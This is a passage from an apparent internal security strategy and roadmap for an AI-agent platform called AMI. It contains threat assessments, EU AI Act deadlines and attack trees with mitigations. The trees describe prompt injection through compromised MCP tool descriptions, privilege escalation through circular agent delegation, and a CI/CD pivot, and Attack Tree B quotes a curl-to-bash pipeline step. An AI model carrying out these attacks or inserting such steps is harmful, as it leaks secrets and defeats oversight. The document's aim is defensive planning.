The most alarming pattern in WS-6 is the stealth pivots from CI/CD environments. AUSPEX (Jul 2025) stole a CI token and pivoted to production. The "tier-0" LLM incidents (Dec 2025-Feb 2026) involved attacker-modified CI pipelines that bypassed all review gates. "A single test file change resulted in protected keys leaking to a remote server."

**Why it is dangerous:**
- CI/CD credentials have high privilege (push to main, deploy)
- Code review is the only gate, but reviewers cannot tell malicious code from legitimate (especially with LLM-generated changes)
- "One test file change" can exfiltrate keys to a remote server
- Configuration drift is invisible until incident response

**Implications for AMI:**
- Guarded agent (SPEC-HOOKS.md §4, security loadout) must enforce CI/CD gating
- `enforces-review` flag at deployment level (SPEC-HOOKS.md §4.2.1)
- Agent manifests must include deployment signatures (can only run what is reviewed and signed)
- Pre-deployment verification against ALL attached scopes (SPEC-HOOKS.md §4.4.1 blocks drift by design)

**Concrete numbers:**
- AUSPEX (Jul 2025): CI token → Kubernetes → 500K records exfiltrated
- Tier-0 LLM incidents (Dec 2025-Feb 2026): 4+ separate attacks, same CI/CD pivot vector
- Target codebase: an open-source security project; upstream accepted modifications

**Research cited:** WS-6 (AUSPEX, Tier-0 LLM incidents), SPEC-HOOKS.md §4

---

#### T7: Multi-Agent Delegation Poisoning (Risk: 20)

As agent deployments shift from single-agent to multi-agent (AMI Phase 2, Q4 2026), the attack surface multiplies. G-Safeguard (Jun 2026, arXiv 2606.10218) demonstrates a universal vulnerability: circular delegation and privilege escalation across agent hierarchies.

**How it works:**
- Malicious agent A asks agent B to "help with a simple request"
- B delegates to A (circular)
- A uses delegated authority to escalate privileges
- No existing architecture detects this pattern

**Why it matters for AMI:**
- AMI explicitly plans multi-agent orchestration (Q4 2026, 18-month roadmap)
- Building A2A security now is cheaper than retrofitting after deployment
- G-Safeguard detection (action-based, not observation-based) should be a requirement for multi-agent releases

**Implications for AMI:**
- A2A protocol (Q4 2026) must include delegation depth tracking
- Maximum delegation depth (e.g., 3 hops) enforced by intercept layer
- Agent identity signing (Q4 A2A deliverable) prevents agent spoofing
- Circular delegation monitor (G-Safeguard detection)
- Per-agent scope limit: "which agents may I delegate to" must be in agent manifests

**Concrete numbers:**
- G-Safeguard (Jun 2026): circular delegation with 2 agents → privilege escalation
- No A2A protocol currently includes security headers
- FP rate <5% with G-Safeguard action-based detection

**Research cited:** G-Safeguard (arXiv 2606.10218), WS-5 papers on multi-agent security

---

#### T19: Agent Supply Chain - Compromised MCP (Risk: 20)

MCP (Model Context Protocol) is the most significant agent-adjacent security concern. An open protocol for agent-tool communication with no built-in security model. Any compromised MCP server can inject malicious tool descriptions, intercept tool calls, or return poisoned context.

**Why it is critical:**
- MCP adoption is exploding (Anthropic, OpenAI, Google, community)
- No authentication, no integrity verification, no sandboxing in the protocol
- "A compromised MCP server is a super-injector" - researcher at MCP Security Working Group
- AMI's tool-call interception (Decision 3) is a natural MCP security gateway

**Implications for AMI:**
- MCP security gateway (Q3-Q4 2026) is a competitive moat
- Tool description signing (tool registry, MCP server identity)
- Permission model (allow/deny/confirm per MCP server, per tool)
- Protocol-level integrity (signed tool descriptions, signed tool responses)
- "AMI as the MCP security layer" is a defensible market position

**Concrete numbers:**
- MCP servers: 3,200+ as of Jun 2026 (growing ~500/month)
- Zero MCP servers with built-in security
- AMI's first-mover advantage window: approximately 6-9 months

---

#### T18: Regulatory Penalty - EU AI Act Non-Compliance (Risk: 16)

The EU AI Act compliance deadline (2 Aug 2026) is 10 weeks from this writing. Fines: up to 35M EUR or 7% of global annual turnover. For a startup, a 7% fine is existential. For an enterprise, it is a board-level risk.

**What is required by 2 Aug 2026:**
- High-risk AI system classification and registration (Art. 6)
- Risk management system (Art. 9)
- Technical documentation, logging, transparency (Art. 11-12)
- Human oversight - stop button, reversal (Art. 14(4))
- Accuracy, robustness, cybersecurity (Art. 15)
- Deployer toolkit (Art. 26-27)

**AMI's current compliance status: ZERO. No classification. No audit trail. No stop button. No reversal. No risk management system.**

**Implications for AMI:**
- This is the single most important delivery deadline - everything else is secondary
- 10 weeks to build and verify the compliance stack
- Certification body engagement must start this week (6+ weeks typical)
- Engineering must parallelize across all 4 tracks (see §4.2 compliance roadmap)
- If AMI misses the deadline, every customer deployment is a regulatory risk → sales impossible

**Concrete numbers:**
- EU AI Act fine cap: 35M EUR or 7% of turnover
- Compliance deadline: 2 Aug 2026 (40 months after proposal, 24 months after entry into force)
- ISO 42001 (AI management): 12-18 months typical timeline
- EU AI Act harmonised standards: expected Jul-Aug 2026, likely delayed

**Research cited:** WS-4 (Regulatory Deep Dive), EU AI Act text, WS-6 (regulatory timeline)

---

### 5.4 Year-by-Year Threat Landscape

#### 2026: The Compliance Tipping Point

| Threat | Risk | AMI Readiness | Action Required |
|---|---|---|---|
| T1/T2 Prompt injection (global) | 25 | Low (no defence) | Decision 1: Semantic Visoir |
| T3/T4 Excessive agency | 20 | Low (tool intercept not built) | Decision 3: Tool-call layer |
| T5 CI/CD configuration drift | 25 | Medium (SPEC-HOOKS.md designed) | Enforce security loadouts |
| T18 EU AI Act penalty | 16 | **CRITICAL GAP** (no compliance) | Emergency compliance build |
| T19 MCP supply chain | 20 | Low (no MCP gateway) | Decision: MCP security gateway |
| T12 Misinformation weaponization | 20 | Low (no hallucination detection) | Q4 2026 validators roadmap |
| T7 Multi-agent poisoning | 20 | Not applicable (single-agent) | Track; build A2A security in Q4 |

**2026 Key Theme: Survive the compliance deadline. Build the containment foundation. The gap between what agents can do and what is secured is the largest it will ever be.**

#### 2027: The Multi-Agent Attack Year

| Threat | Risk | AMI Readiness | Action Required |
|---|---|---|---|
| T7 Multi-agent delegation poisoning | 20 | Medium (A2A planned Q4) | Monitor detection (G-Safeguard) |
| T19 MCP supply chain | 20 | Medium (gateway planned Q3-Q4) | MCP security as standard feature |
| T16 TEE side-channel (CC adoption) | 8 | Low (CC planned Q1) | Continuous red-teaming of CC stack |
| T17 Inter-agent communication | 12 | Medium (A2A planned) | Encrypted, signed, authenticated |
| T20 Session replay poisoning | 12 | Low (no log integrity) | Decision 2: Hash-chain audit |
| T14 Output integrity (poisoned training) | 16 | Low (no training pipeline) | Track; training pipelines out of scope for now |
| T6 Supply chain dataset poisoning (CPA) | 15 | Low | Track; benchmark CPA defence |

**2027 Key Theme: As agents proliferate, the multi-agent attack surface becomes the dominant vector. Year of federation security. AMI must ship A2A with security baked in, not bolted on.**

#### 2028: Autonomous Threat Ecosystem

| Threat | Risk | AMI Readiness | Action Required |
|---|---|---|---|
| T11 LLM-rooted worm propagation | 15 | Low | Research phase; agent worm vaccines |
| T15 Side-channel in agent output | 6 | Low | Research phase |
| T10 Model extraction | 12 | Medium (TEE planned) | Output perturbation standards |
| T9 AutoDoS (token cost attacks) | 12 | Medium (rate limiting) | Per-agent cost budgets |
| T8 Jailbreak via multi-turn | 20 | Medium (rate limit + context) | Continuous adaptation to new techniques |

**2028 Key Theme: Agent-to-agent worms and autonomous threat propagation. AMI's multi-agent security (G-Safeguard, A2A security, delegation depth tracking) becomes a must-have, not a differentiator.**

---

### 5.5 Attack Trees - Three Most Likely Attack Scenarios

#### Attack Tree A: Supply Chain Injection via MCP

Scenario: Attacker compromises an MCP server used by an enterprise agent team. The server returns malicious tool descriptions and intercepts tool responses.

```
1. Compromise MCP server
   ├── 1.1 Known CVE in MCP library (0-day at protocol level)
   ├── 1.2 Weak MCP server authentication (no identity verification)
   └── 1.3 Social engineering of MCP server admin

2. Inject malicious tool description
   ├── 2.1 Tool "file_read" returns attacker-controlled content → prompt injection
   ├── 2.2 Tool "api_call" routes data to attacker endpoint
   └── 2.3 Tool "db_query" returns malicious SQL or modified results

3. Payload delivery
   ├── 3.1 Injected tool description causes LLM to call attacker tool
   ├── 3.2 Tool output injects prompt (indirect injection)
   └── 3.3 Agent acts on injected instruction with full permissions

MITIGATION (AMI):
   ├── MCP security gateway: signed tool descriptions (prevents 2.x)
   ├── Tool-call interception: default-deny for unverified servers (prevents 3.x)
   ├── Taint propagation: untrusted server output → low taint → high authority actions blocked
   └── Audit trail: all MCP calls logged with server identity → forensic evidence
```

#### Attack Tree B: CI/CD Pipeline Pivot via Agent

Scenario: Developer uses AMI agent to modify CI/CD pipeline. Agent, operating with developer credentials, unknowingly writes a malicious pipeline step.

```
1. Initiate agent session (authorised)
   ├── 1.1 Developer asks agent to "fix the build script"
   └── 1.2 Agent has scoped write access to CI/CD repo

2. Malicious code injected
   ├── 2.1 LLM generates code containing malicious pipeline step
   ├── 2.2 No reviewer can distinguish malicious from legitimate
   ├── 2.3 "One test file change" approach (Tier-0 pattern)
   └── 2.4 Pipeline step: `- run: curl $SECRET_KEY | base64 -d | bash`

3. CI/CD execution
   ├── 3.1 Pipeline runs with CI credentials (production access)
   ├── 3.2 Secret exfiltration occurs in pipeline
   ├── 3.3 Attacker pivots to production (Kubernetes, AWS, GCP)
   └── 3.4 Data exfiltration or destruction

MITIGATION (AMI):
   ├── Guarded agent security loadout: enforces-review (prevents 2.1 without review)
   ├── Pre-deployment verification against attached scopes (SPEC-HOOKS.md §4.4.1)
   ├── CI/CD agent policies: no privileged credential access
   └── Hash-chain audit trail: full pipeline modification history → incident detection
```

#### Attack Tree C: Multi-Agent Circular Delegation with Privilege Escalation

Scenario: Two or more agents collude (or are independently compromised) to exceed their individual permission scopes through circular delegation.

```
1. Agent A receives conflicting or malicious instruction
   ├── 1.1 Direct injection into Agent A
   ├── 1.2 Indirect injection via RAG context
   └── 1.3 Delegation from compromised Agent C

2. Agent A delegates to Agent B
   ├── 2.1 "Verify the following data" (seems legitimate)
   ├── 2.2 B has higher authority scope than A
   └── 2.3 No delegation depth tracking (no hop counter)

3. Agent B delegates back to Agent A (circular)
   ├── 3.1 "Now execute this action using my authority" (escalation)
   ├── 3.2 A now has B's delegated authority + A's original authority
   └── 3.3 Combined authority exceeds any defined scope

4. Payload execution
   ├── 4.1 A executes action requiring B's authority (privilege escalation)
   ├── 4.2 Both audit trails show "delegated from peer" - normal pattern
   └── 4.3 No system detects the escalation (G-Safeguard vulnerability)

MITIGATION (AMI):
   ├── Delegation depth tracking: max 3 hops, enforced at intercept layer
   ├── Agent identity signing: cannot delegate to same agent twice (circular detection)
   ├── Per-agent scope limit: manifests list permitted delegate targets
   └── G-Safeguard detection: action-based circular delegation monitoring (Q2 2027)
```

---

## Section 6: 18-Month Roadmap (Q3 2026 - Q3 2027)

### 6.1 Roadmap Overview

Four engineering tracks running in parallel, synchronized at 2-week sprint boundaries:

| Track | Focus | Lead Time | Team Size |
|---|---|---|---|
| **Track A: Compliance & Governance** | EU AI Act, ISO 27001, ISO 42001, SOC 2 | 18 months | 1-2 engineers + legal |
| **Track B: Core Security** | Semantic Visor, tool interception, audit trail, stop button, sandbox | 12 months | 2-3 engineers |
| **Track C: Agent Platform** | Multi-agent orchestration (A2A, handoff), memory, CC, evaluation | 18 months | 2-3 engineers |
| **Track D: Ecosystem & Tooling** | MCP gateway, OTEL/SIEM, loadouts, neocloud deploy, research tracking | 18 months | 1-2 engineers |

### 6.2 Quarterly Milestones

#### Q3 2026 (Jul-Sep): Compliance Foundation

**Theme:** Survive the 2 Aug EU AI Act deadline. Build the containment-first security architecture.

| Sprint | Track A (Compliance) | Track B (Core Security) | Track C (Agent Platform) | Track D (Ecosystem) |
|---|---|---|---|---|
| S1 (Jul 1-14) | Classification audit; cert body engagement; ISMS policy framework | Tool-call interception design; schema registry spec | Agent interrupt design; state checkpoint spec | MCP security gateway design; tool manifest signing spec |
| S2 (Jul 15-28) | Deployer toolkit draft; risk assessment workbook | ToolRegistry + ToolCallValidator implementation | SafeHaltManager implementation; halt sequence state machine | Tool manifest signing implementation; schema registry |
| S3 (Jul 29-Aug 11) | Internal compliance dry run; gap closure | gVisor sandbox integration; sandbox CLI wrapper | Interrupt integration into ReAct loop; checkpoint serialization | MCP gateway: signed tool verification; deny-unknown-servers |
| **S4 (Aug 2)** | **EU AI ACT DEADLINE** | **Compliance deliverable verification** | **Compliance deliverable verification** | **Compliance deliverable verification** |
| S5 (Aug 12-25) | Certificate body engagement; ISMS operational start | Semantic Visor Guest/Visor split design; STI protocol | Lakera/PromptGuard injection detection | OTEL instrumentation design; span model |
| S6 (Aug 26-Sep 8) | ISO 27001 gap analysis; SoA draft | Semanic Visor middleware implementation; Visor.check() | Inversion detection framework | OTEL implementation: action spans, audit span |
| S7 (Sep 9-22) | Gap closure; SoA review | Semanic Visor: STI protocol enforcement | Agent evaluation harness design | SIEM exporters design; syslog, Kafka, CW |
| S8 (Sep 23-30) | All Q3 compliance docs delivered | Full Q3 stack integration test | Pen test: stop button, checkpoint, inversion | Pen test: sandbox escape, MCP security |

**Q3 Deliverables:**
- `ami/core/security/visor.py` with Guest/Visor split, STI protocol, Visor.check()
- `ami/core/security/taint.py` with TaintTracker, source tracking
- `ami/core/agents/tools/registry.py` + `validator.py` + `permissions.py`
- `ami/core/agents/interrupt.py` + `reversal.py` + `checkpoint.py`
- `ami/core/runtime/sandbox.py` + `ami-sandbox` CLI
- `ami/core/audit/log.py` with hash-chain append, replay, verify, export
- `ami/core/security/injection_detector.py` with Lakera/PromptGuard
- `ami/hooks/events.py` with PRE_TOOL_CALL, POST_TOOL_CALL
- `ami-hooks core/validators/tool_call_validator.py`
- `ami-hooks core/validators/injection_validator.py`
- `ami-hooks core/validators/stop_button_validator.py`
- `ami/config/tools/*.yaml` tool schemas
- `ami/config/loadouts/guarded.yaml` compliance loadout
- `docs/compliance/HIGH-RISK-CLASSIFICATION.md`
- `docs/compliance/EU-AI-ACT-COMPLIANCE.md`
- `docs/compliance/DEPLOYER-TOOLKIT.md`
- `tests/unit/agents/test_interrupt.py`
- `tests/unit/agents/test_reversal.py`
- `tests/unit/audit/test_hash_chain.py`
- `tests/unit/security/test_visor.py`
- `tests/unit/security/test_taint.py`
- `tests/unit/security/test_tool_validator.py`
- `tests/integration/runtime/test_sandbox.py`
- `tests/integration/compliance/test_e2e.py`

**Verification Gate (end of Q3):**
- All unit tests pass with >90% branch coverage
- Integration test: agent session with all security layers
- Penetration test: top 10 OWASP LLM attack patterns
- Latency overhead <50ms per action
- Hash chain integrity: detect any single-byte modification
- Stop button: halt in <5s from any yield point
- Sandbox: destructive operations fail safely
- No known compliance gaps against EU AI Act

---

#### Q4 2026 (Oct-Dec): Observability + Multi-Agent

**Theme:** Make every action observable. Build the multi-agent foundation with security baked in.

| Sprint | Track A (Compliance) | Track B (Core Security) | Track C (Agent Platform) | Track D (Ecosystem) |
|---|---|---|---|---|
| S1 | ISMS operational (month 1); risk treatment | OTEL traces; Jaeger integration | A2A protocol: handshake, signing, transport | MCP gateway production hardening |
| S2 | Evidence pipeline: automated evidence collection | OTEL spans: all actions, audit events | A2A protocol: message integrity, replay protection | SIEM exporter implementation (syslog) |
| S3 | SOC 2 Type I: readiness prep | OTEL: custom agent metrics (latency, token cost, tool call count) | A2A protocol: delegation depth tracking | SIEM exporter implementation (Kafka) |
| S4 | SOC 2 Type I: auditor engagement | LLM-in-loop validators (Phase 2 hooks design) | Multi-agent orchestration: handoff, context isolation | SIEM exporter implementation (CloudWatch) |
| S5 | ISO 27001 Stage 1 prep | LLM-in-loop validators: safe coding, data access patterns | Multi-agent: per-agent scope manifests | MCP gateway: deny-unknown-servers + signed manifests production |
| S6 | ISO 27001 Stage 1 audit | LLM-in-loop validators: delegation pattern detection | Multi-agent: evaluation harness (NIST dimensions) | Neocloud deploy: `ami deploy --neocloud` MVP |
| S7 | Stage 1 findings closure | Q4 integration: core sec + multi-agent + OTEL | A2A + multi-agent integration test | Pen test: inter-agent injection |
| S8 | SOC 2 Type I report issued | Q4 stack hardening + performance tuning | Multi-agent bugfix + hardening | Q4 ecosystem release |

**Q4 Deliverables:**
- OTEL instrumentation: Jaeger traces, custom agent metrics
- SIEM exporters: syslog (RFC 5424), Kafka (Avro), CloudWatch
- LLM-in-loop validators: safe coding, data access patterns, delegation pattern detection
- A2A protocol: handshake, message signing, transport, delegation depth tracking
- Multi-agent orchestration: handoff, context isolation, per-agent scope manifests
- Agent evaluation harness (NIST dimensions)
- MCP gateway: signed tool manifests, deny-unknown-servers, production hardening
- Neocloud deploy: `ami deploy --neocloud` MVP (CoreWeave, Modal)
- SOC 2 Type I report
- ISO 27001 Stage 1 passed
- `tests/unit/agents/test_a2a.py`
- `tests/unit/agents/test_multiagent.py`
- `tests/integration/observability/test_otel.py`
- `tests/integration/observability/test_siem_export.py`
- `tests/integration/multiagent/test_delegation.py`
- `tests/integration/multiagent/test_context_isolation.py`
- `docs/developer-guide/LLM-IN-LOOP-VALIDATORS.md`
- `docs/integrations/MCP-SECURITY-GATEWAY.md`
- `docs/compliance/SOC-2-TYPE-I-STATUS.md`
- `docs/compliance/ISO-27001-STAGE-1.md`

**Verification Gate (end of Q4):**
- OTEL traces cover 100% of agent actions
- SIEM events within 1s of action
- A2A handshake: mutual authentication, replay protection
- Delegation depth: enforced at 3 hops max
- Multi-agent context isolation: no cross-agent data leak
- LLM-in-loop validators: >90% prohibited pattern detection
- MCP gateway: unverified servers blocked
- SOC 2 Type I: no critical control deficiencies
- ISO 27001 Stage 1: all gates passed

---

#### Q1 2027 (Jan-Mar): Memory + Confidential Computing

**Theme:** Make agent memory trustworthy. Add hardware-backed trust.

| Sprint | Track A (Compliance) | Track B (Core Security) | Track C (Agent Platform) | Track D (Ecosystem) |
|---|---|---|---|---|
| S1 | AIMS Clause 4 (Context): scope, stakeholders | Behaviour drift detection (ProbGuard) design | Memory integrity (cryptographic) design | Security loadout profiles design (4 profiles) |
| S2 | AIMS Clause 5 (Leadership): AI policy, roles | ProbGuard implementation: behavioural profiles | Memory integrity implementation: signing + verification | Security loadout: guarded (compliance) |
| S3 | AIMS Clause 6 (Planning): risk assessment, AI objectives | ProbGuard: deviation thresholds, alerting | Hierarchical memory (AgentSafe) design | Security loadout: isolated (multi-tenant) |
| S4 | ISO 27001 Stage 2 prep | Confidential CC design: Kata, TDX, CC | Hierarchical memory: cross-session, authority verification | Security loadout: high-security (air-gap) |
| S5 | ISO 27001 Stage 2 audit | Confidential CC implementation: CPU attestation | AgentSafe memory: permission model, access control | Security loadout: development (permissive) |
| S6 | ISO 27001 Stage 2 passed | Confidential CC: GPU composite attestation | Memory + CC integration: encrypted memory in TEE | SOC 2 Type II period starts |
| S7 | SOC 2 Type II (month 1-2) | Q1 integration: drift detection + memory + CC | Performance benchmarks | Loadout documentation + guides |
| S8 | AIMS review | Q1 stack hardening | Pen test: memory tampering, TEE extraction | Q1 ecosystem release |

**Q1 Deliverables:**
- Behaviour drift detection (ProbGuard): behavioural profiles, deviation detection, alerting
- Memory integrity (cryptographic): signing, verification, tamper detection
- Hierarchical memory (AgentSafe): cross-session, authority verification, permission model
- Confidential Computing: Kata runtime, TDX CPU attestation, GPU composite attestation
- 4 security loadout profiles: guarded (compliance), isolated (multi-tenant), high-security (air-gap), development (permissive)
- Security loadout enforcement: container locks (`boot.yaml` template + pinned hash), deployment enforces review flag
- ISO 27001 Stage 2 passed → **ISO 27001 certification issued**
- SOC 2 Type II period starts
- AIMS Clauses 4-6 complete
- `ami/core/security/drift/detector.py`
- `ami/core/security/memory/crypto.py`
- `ami/core/security/memory/agentsafe.py`
- `ami/core/runtime/confidential/attestation.py`
- `ami/core/runtime/confidential/composite.py`
- `ami/config/loadouts/guarded.yaml`
- `ami/config/loadouts/isolated.yaml`
- `ami/config/loadouts/high_security.yaml`
- `ami/config/loadouts/development.yaml`
- `tests/unit/security/test_drift_detection.py`
- `tests/unit/security/test_memory_crypto.py`
- `tests/integration/runtime/test_confidential_compute.py`
- `tests/integration/loadouts/test_enforcement.py`
- `docs/compliance/ISO-27001-CERTIFICATION.md`
- `docs/compliance/AIMS-CLAUSES-4-6.md`
- `docs/user-guide/SECURITY-LOADOUTS.md`

**Verification Gate (end of Q1):**
- Drift detection: >2SD deviation alerts within 38s (paper-validated timing)
- Memory integrity: tampered memory detected; <5ms check overhead
- AgentSafe: cross-session memory with authority verification; <15ms overhead
- Confidential Compute: CPU attestation pass; GPU composite attestation pass; TEE memory encryption
- Loadout enforcement: container with incorrect hash blocked; deployment without review flag blocked
- ISO 27001 Stage 2: all non-conformities closed → certification issued
- SOC 2 Type II: evidence pipeline operational

---

#### Q2 2027 (Apr-Jun): Formal Verification + Advanced Multi-Agent

**Theme:** Prove security properties formally. Scale multi-agent safely.

| Sprint | Track A (Compliance) | Track B (Core Security) | Track C (Agent Platform) | Track D (Ecosystem) |
|---|---|---|---|---|
| S1 | AIMS Clause 7 (Support): resources, competence | Formal DSL runtime verification design | Multi-agent anomaly detection (G-Safeguard) design | Neocloud: CoreWeave production provider |
| S2 | AIMS Clause 8 (Operation): impact assessment | Formal DSL: specification language for safety properties | G-Safeguard: action-based delegation monitoring | Neocloud: Modal production provider |
| S3 | SOC 2 Type II (month 4-5) | Formal DSL: runtime monitor generation | G-Safeguard: circular delegation detection | Neocloud: Scaleway + Hetzner |
| S4 | Internal compliance audit | Formal DSL: integration with tool-call interception layer | Multi-agent: delegation graph analysis | Agent eval harness: CI/CD integrated |
| S5 | Gap closure | Formal DSL: performance tuning (target <1% task deg) | Multi-agent: anomaly alerting + response | Agent eval harness: NIST dimension scores |
| S6 | Q2 compliance review | Formal DSL: pen test against known attack families | Multi-agent: integration test with G-Safeguard + A2A | Open-source: MCP security library contribution |

**Q2 Deliverables:**
- Formal DSL runtime verification: safety properties specification, runtime monitor generation
- DSL + tool-call interception integration
- G-Safeguard: action-based circular delegation monitoring, anomaly detection
- Multi-agent delegation graph analysis
- Neocloud providers: CoreWeave, Modal, Scaleway, Hetzner
- Agent evaluation harness: NIST dimensions, CI/CD integrated
- Open-source MCP security library
- AIMS Clauses 7-8 complete
- SOC 2 Type II mid-period evidence
- `ami/core/security/formal/dsl.py`
- `ami/core/security/formal/monitor.py`
- `ami/core/security/formal/properties.yaml` (safety properties spec)
- `ami/core/security/multiagent/gsafeguard.py`
- `ami/core/security/multiagent/delegation_graph.py`
- `ami/scripts/ami-eval`
- `tests/unit/security/test_formal_dsl.py`
- `tests/integration/security/test_formal_integration.py`
- `tests/integration/multiagent/test_gsafeguard.py`
- `tests/integration/deploy/test_neocloud.py`
- `tests/integration/evaluation/test_harness.py`
- `docs/compliance/AIMS-IMPACT-ASSESSMENT.md`

**Verification Gate (end of Q2):**
- Formal DSL: >90% attack detection rate; <1% task degradation (paper-validated targets)
- G-Safeguard: circular delegation detection; FP <5% (paper-validated)
- Multi-agent: delegation graph anomaly detection
- Neocloud deploy: <15 min for `ami deploy --neocloud`
- Agent eval harness: reproducible NIST dimension scores in CI

---

#### Q3 2027 (Jul-Sep): Production Maturity + Certification Milestone

**Theme:** Ship all certifications. Cryptographic memory frontier.

| Sprint | Track A (Compliance) | Track B (Core Security) | Track C (Agent Platform) | Track D (Ecosystem) |
|---|---|---|---|---|
| S1 | AIMS Clause 9 (Evaluation): monitoring, internal audit | Cryptographic memory (AgentCrypt FHE) design | Harmonised standards alignment (EU AI Act) | AMI security benchmark design |
| S2 | ISO 42001 Stage 1 prep | AgentCrypt: FHE for agent memory | Standards gap analysis | Benchmark: NIST dimensions implementation |
| S3 | ISO 42001 Stage 1 audit | AgentCrypt: correctness verification | Standards compliance roadmap | Benchmark: results publication |
| S4 | SOC 2 Type II (month 6) | AgentCrypt: performance optimization | Agent productivity measurement | Benchmark: CI/CD integration |
| S5 | ISO 42001 Stage 2 prep | AgentCrypt: security proof | Integration: all features combined | Enterprise deployment guide |
| S6 | ISO 42001 Stage 2 audit | AgentCrypt: pen test | Production hardening | Release documentation |
| S7 | SOC 2 Type II report issued | Final hardening + performance | Final integration test | Final ecosystem release |
| **S8** | **ISO 42001 Stage 2 PASSED** | **All features production-ready** | **All integrations verified** | **18-month roadmap complete** |

**Q3 Deliverables:**
- Cryptographic memory (AgentCrypt FHE): fully homomorphic encryption for agent memory
- Harmonised standards alignment matrix
- AMI security benchmark with NIST dimension scores
- SOC 2 Type II report
- ISO 42001 Stages 1 and 2: **ISO 42001 certification issued**
- All 18-month roadmap features production ready
- `ami/core/security/memory/agentcrypt.py`
- `ami/core/runtime/confidential/harmonised_standards.py`
- `ami/scripts/ami-benchmark`
- `tests/unit/security/test_agentcrypt.py`
- `tests/integration/certification/test_iso_42001.py`
- `tests/integration/benchmark/test_nist_dimensions.py`
- `docs/compliance/HARMONISED-STANDARDS-ALIGNMENT.md`
- `docs/compliance/ISO-42001-CERTIFICATION.md`
- `docs/compliance/SOC-2-TYPE-II.md`
- `docs/enterprise/DEPLOYMENT-GUIDE.md`
- `docs/enterprise/BENCHMARK-RESULTS.md`

**Verification Gate (end of Q3 2027):**
- AgentCrypt FHE: >84% correctness; privacy in 100% of test scenarios (paper-validated targets)
- Harmonised standards: zero critical gaps; all "shall" requirements addressed
- Security benchmark: NIST dimensions scored and published
- SOC 2 Type II: report with clean opinion
- ISO 42001: certification issued with no major non-conformities
- Full roadmap verification: all 18-month features operational, integrated, tested

---

### 6.3 Resource Summary

| Resource | Q3 2026 | Q4 2026 | Q1 2027 | Q2 2027 | Q3 2027 |
|---|---|---|---|---|---|
| Headcount | 4 | 4 | 4 | 4 | 4 |
| Engineer-weeks | 18 | 28 | 24 | 24 | 20 |
| Total engineer-weeks (cumulative) | 18 | 46 | 70 | 94 | 114 |
| Estimated cost (€150K/yr per eng) | €43K | €67K | €58K | €58K | €48K |
| **Total estimated cost** | | | | | **€273K** |

### 6.4 Key Dependencies

| Dependency | Required By | Risk | Mitigation |
|---|---|---|---|
| EU AI Act harmonised standards published | Q3 2026 | HIGH (likely delayed) | Draft compliance against available guidance; update when standards published |
| ISO certification body availability | Q3-Q4 2026 | MEDIUM (6-8 week lead time) | Engage this week |
| MCP protocol security additions | Q4 2026 | MEDIUM (protocol change) | Build gateway independent of protocol changes; contribute upstream if needed |
| CoreWeave/Modal production API | Q2 2027 | LOW (both GA) | Early access program for key customers |
| LLM API rate limits (Lakera/PromptGuard) | Q3 2026 | LOW | Self-hosted option as backup |
| Open-source community contributions | Q2 2027 | LOW | Not critical path; single-thread capable |
| AMD SEV-SNP / Intel TDX hardware availability | Q1 2027 | MEDIUM (supply chain) | Support software TEE (Kata without HW) as fallback |

---

## Section 7: Key Takeaways & Action Items

### 7.1 Top 10 Action Items (Ranked by Urgency and Impact)

| Rank | Action | Owner | Deadline | Strategic Impact | Dependencies |
|---|---|---|---|---|---|
| **1** | **Engage EU AI Act certification body** | CRO / Legal | This week | Regulatory survival - without cert body, no compliance pathway | None |
| **2** | **Build hash-chain audit trail (Decision 2)** | Eng Track A | 15 Jul 2026 | Art. 12 compliance - foundational for all logging | None |
| **3** | **Implement tool-call interception (Decision 3)** | Eng Track B | 15 Jul 2026 | Excessive agency fix - prevents Kiro/PocketOS-class incidents | Tool schema registry |
| **4** | **Implement stop button + reversal (Decision 4)** | Eng Track A | 25 Jul 2026 | Art. 14(4)(d)(e) compliance - legally mandatory | Interrupt integration into ReAct |
| **5** | **Build Semantic Visor MVP (Decision 1)** | Eng Track B | 1 Aug 2026 | Prompt injection containment - structurally necessary | Tool interception layer |
| **6** | **Complete EU AI Act compliance docs** | Legal + Eng | 2 Aug 2026 | **ALL PRECEDING MUST COMPLETE BY THIS DATE** | Actions 1-5 |
| **7** | **Implement gVisor sandbox + MCP gateway** | Eng Track D | 1 Sep 2026 | Agent supply chain security; code execution isolation | Tool interception |
| **8** | **Begin ISO 27001 evidence pipeline** | Eng Track A | 15 Sep 2026 | Certification foundation - must start early for evidence period | ISMS policy framework |
| **9** | **Publish A2A security protocol (signed, depth-tracked)** | Eng Track C | 1 Nov 2026 | Multi-agent foundation - must ship before multi-agent enterprise adoption | MCP gateway |
| **10** | **Build behaviour drift detection + CC** | Eng Tracks B+C | 15 Mar 2027 | Production security maturity - required for sensitive enterprise workloads | OTEL traces (Q4 2026) |

### 7.2 Must-Win Battles

**Battle 1: EU AI Act Compliance by 2 Aug 2026**

| Aspect | Assessment |
|---|---|
| Current status | Zero compliance (no audit trail, no stop button, no classification, no risk management) |
| Required state | Full compliance for high-risk classification; deployer toolkit; technical docs; audit; oversight |
| Effort | 10 weeks, ~18 engineer-weeks across 4 tracks |
| Consequences of failure | Cannot sell to EU enterprises; regulatory risk to AMI as deployer; 35M EUR or 7% fine potential |
| **Decision: ALL HANDS. This is the single priority for Q3 2026. Nothing else matters.** |

**Battle 2: Semantic Virtualization - First to Production**

| Aspect | Assessment |
|---|---|
| Current status | Academic (AgentVisor arXiv 2604.24118). No production implementation exists. |
| Required state | Production Guest/Visor split with STI protocol for AMI agents |
| Effort | 2 weeks for MVP (Q3 2026); 4 weeks for STI enforcement (Q4 2026) |
| Window | 6-9 month first-mover advantage before FAANG or well-funded startups adopt |
| **Decision: Ship MVP in Q3 2026. Position as "the only production semantic visor for AI agents."** |

**Battle 3: Multi-Agent Security Before Multi-Agent Proliferation**

| Aspect | Assessment |
|---|---|
| Current status | Zero multi-agent security (single-agent only). No A2A protocol. No delegation tracking. |
| Required state | A2A with signed messages, delegation depth tracking, circular detection |
| Effort | 6 weeks for A2A protocol (Q4 2026); 4 weeks for G-Safeguard (Q2 2027) |
| Market window | Enterprise multi-agent deployments expected H1 2027 |
| **Decision: Build A2A with security baked in (not bolted on). Ship Q4 2026 before multi-agent goes mainstream.** |

**Battle 4: Certification Trinity (ISO 27001 + SOC 2 + ISO 42001)**

| Aspect | Assessment |
|---|---|
| Current status | Zero certifications. Competitors: FAANG avg 5/5, startups avg 2.5/5, neoclouds avg 3.5/5. |
| Required state | ISO 27001 (Mar 2027), SOC 2 Type II (Sep 2027), ISO 42001 (Sep 2027) |
| Effort | 18 months, concurrent with engineering |
| Consequences | Without certifications, enterprise procurement requires exceptions. With all three, AMI has the strongest compliance posture in the market. |
